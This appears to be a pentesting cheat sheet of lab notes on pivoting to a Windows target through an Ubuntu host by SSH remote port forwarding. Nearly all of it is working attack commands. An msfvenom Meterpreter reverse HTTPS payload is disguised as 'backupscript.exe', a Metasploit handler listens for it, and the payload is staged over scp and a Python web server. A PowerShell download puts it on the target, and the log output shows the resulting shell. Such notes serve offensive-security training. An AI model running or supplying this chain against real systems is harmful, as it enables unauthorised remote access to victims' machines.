
### Creating a Windows Payload with msfvenom

**Command:**

```Shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> LPORT=8080 -f exe -o backupscript.exe
```

**Explanation:**  
Generates a Meterpreter reverse HTTPS payload targeting pivot host's IP and port 8080.

---

### Configuring & Starting the multi/handler

**Command:**

```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

**Explanation:**  
Starts a Metasploit listener to handle incoming reverse shells on port 8000.

---

### Transferring Payload to Pivot Host

```Shell
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

**Explanation:**  
Securely copies the payload to the Ubuntu pivot host using SCP.

---

### Starting Python3 Webserver on Pivot Host

**Command:**

```Shell
python3 -m http.server 8123
```

**Explanation:**  
Hosts the payload on a local HTTP server for download from the Windows target.

---

### Downloading Payload on the Windows Target

```PowerShell
Invoke-WebRequest -Uri "<http://172.16.5.129:8123/backupscript.exe>" -OutFile "C:\\backupscript.exe"
```

**Explanation:**  
Uses PowerShell to download the payload from the Ubuntu host to the Windows machine.

---

### Using SSH -R (Remote Port Forwarding)

```Shell
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

**Explanation:**  
Forwards Ubuntu host port 8080 to the attack host’s Metasploit listener on port 8000 via SSH.

---

### Viewing the Logs from the Pivot

**Command:** _(log output example)_

```Plain
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: channel 1: connected to 0.0.0.0 port 8000
```

**Explanation:**  
SSH debug logs showing successful port forwarding from the Windows target to the attack listener.

---

### Meterpreter Session Established

**Command:**

```Plain
meterpreter > shell
```

**Explanation:**  
Confirms successful reverse shell connection through SSH reverse port forwarding via the Ubuntu server.

---